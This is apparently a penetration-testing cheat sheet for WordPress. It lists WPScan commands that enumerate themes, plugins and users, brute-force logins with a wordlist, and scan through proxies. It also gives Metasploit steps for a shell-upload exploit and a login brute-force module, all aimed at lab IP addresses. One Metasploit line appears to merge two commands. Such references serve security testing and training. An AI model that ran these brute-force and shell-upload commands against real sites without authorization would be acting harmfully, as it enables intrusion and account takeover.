# WordPress Hacking

### WPScan - WordPress Vulnerability Scanner

***

WPScan is a powerful tool for identifying vulnerabilities in WordPress websites.

Display WPScan help

```bash
wpscan -hh
```

Scan the WordPress version

```bash
wpscan --url <http://192.168.1.105/wordpress/>
```

Enumerate WordPress themes

```bash
wpscan --url <http://192.168.1.105/wordpress/> -e at
```

Enumerate WordPress plugins

```bash
wpscan --url <http://192.168.1.105/wordpress/> -e ap
```

Enumerate WordPress usernames

```bash
wpscan --url <http://192.168.1.105/wordpress/> -e u
```

Enumerate all (themes, plugins, and usernames) in a single command

```bash
wpscan --url <http://192.168.1.105/wordpress/> -e at -e ap -e u
```

Brute-force attack using WPScan

```bash
wpscan --url <http://192.168.1.105/wordpress/> -U user.txt -P /usr/share/wordlists/rockyou.txt
```

Shell Upload using Metasploit (exploit module)

```bash
use exploit/unix/webapp/wp_slideshowgallery_upload
set rhost 192.168.1.105
set targeturi /wordpress
set username admin
set password jessica exploit
```

Scanning over a proxy server:

```bash
wpscan --url <http://192.168.1.105/wordpress/> --proxy <http://192.168.1.105:3128>
```

Scanning with HTTP authentication enabled

```bash
wpscan --url <http://192.168.1.105/wordpress/> --http-auth evil:123
```

### Crack WordPress Login

***

#### WPScan&#x20;

To crack a WordPress login using WPScan. Run the following command with the target WordPress site, a list of usernames, and a password list.

```bash
wpscan --url <http://192.168.1.100/wordpress/> -U users.txt -P /usr/share/wordlists/rockyou.txt
```

#### Metasploit

Metasploit provides a module for WordPress login auditing.

Open the Metasploit console

```bash
msfconsole
```

Use the WordPress login enumeration auxiliary module

```bash
use auxiliary/scanner/http/wordpress_login_enum
```

Configure the module with the target host and URI, user and password files

```bash
set rhosts 192.168.1.100
set targeturi /wordpress
set user_file user.txt
set pass_file pass.txt
```

Exploit the module

```bash
exploit
```
